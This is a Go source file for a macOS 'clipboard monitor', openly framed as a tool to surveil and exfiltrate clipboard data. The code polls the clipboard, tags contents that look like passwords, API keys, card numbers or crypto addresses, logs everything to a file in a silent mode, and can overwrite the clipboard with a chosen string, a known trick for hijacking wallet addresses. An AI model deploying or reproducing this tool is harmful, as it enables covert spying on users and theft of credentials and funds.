// NullSec macOS Clipboard Monitor
// Monitor and exfiltrate clipboard data
// Build: GOOS=darwin go build -o nullsec-clipboard clipboard.go
package main

import (
	"crypto/md5"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

func banner() {
	fmt.Println(`
╔═══════════════════════════════════════╗
║   NullSec Clipboard Monitor - macOS   ║
║   Real-time clipboard surveillance    ║
╚═══════════════════════════════════════╝`)
}

func getClipboard() string {
	cmd := exec.Command("pbpaste")
	out, err := cmd.Output()
	if err != nil {
		return ""
	}
	return string(out)
}

func setClipboard(content string) {
	cmd := exec.Command("pbcopy")
	cmd.Stdin = strings.NewReader(content)
	cmd.Run()
}

func hashContent(s string) string {
	return fmt.Sprintf("%x", md5.Sum([]byte(s)))[:16]
}

func containsSensitive(s string) []string {
	var found []string
	patterns := map[string]string{
		"email":      "@",
		"password":   "password",
		"api_key":    "api",
		"credit_card": "4",
		"ssn":        "-",
		"btc":        "bc1",
		"eth":        "0x",
	}

	lower := strings.ToLower(s)
	for name, pattern := range patterns {
		if strings.Contains(lower, pattern) {
			found = append(found, name)
		}
	}
	return found
}

func main() {
	banner()

	output := flag.String("output", "", "Output file for captured data")
	interval := flag.Int("interval", 500, "Check interval in ms")
	replace := flag.String("replace", "", "Replace clipboard content with this")
	silent := flag.Bool("silent", false, "Silent mode (no output)")
	flag.Parse()

	var logFile *os.File
	if *output != "" {
		var err error
		logFile, err = os.OpenFile(*output, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
		if err != nil {
			fmt.Printf("[!] Cannot open log file: %v\n", err)
			return
		}
		defer logFile.Close()
	}

	if !*silent {
		fmt.Println("[*] Monitoring clipboard... (Ctrl+C to stop)")
	}

	lastHash := ""
	count := 0

	for {
		content := getClipboard()
		hash := hashContent(content)

		if hash != lastHash && content != "" {
			lastHash = hash
			count++
			timestamp := time.Now().Format("15:04:05")

			sensitive := containsSensitive(content)
			sensStr := ""
			if len(sensitive) > 0 {
				sensStr = fmt.Sprintf(" [!SENSITIVE: %s]", strings.Join(sensitive, ","))
			}

			preview := content
			if len(preview) > 50 {
				preview = preview[:50] + "..."
			}
			preview = strings.ReplaceAll(preview, "\n", "\\n")

			if !*silent {
				fmt.Printf("[%s] #%d: %s%s\n", timestamp, count, preview, sensStr)
			}

			if logFile != nil {
				logFile.WriteString(fmt.Sprintf("[%s] %s\n---\n%s\n---\n\n", timestamp, sensStr, content))
			}

			if *replace != "" {
				setClipboard(*replace)
				if !*silent {
					fmt.Printf("    → Replaced with: %s\n", *replace)
				}
			}
		}

		time.Sleep(time.Duration(*interval) * time.Millisecond)
	}
}
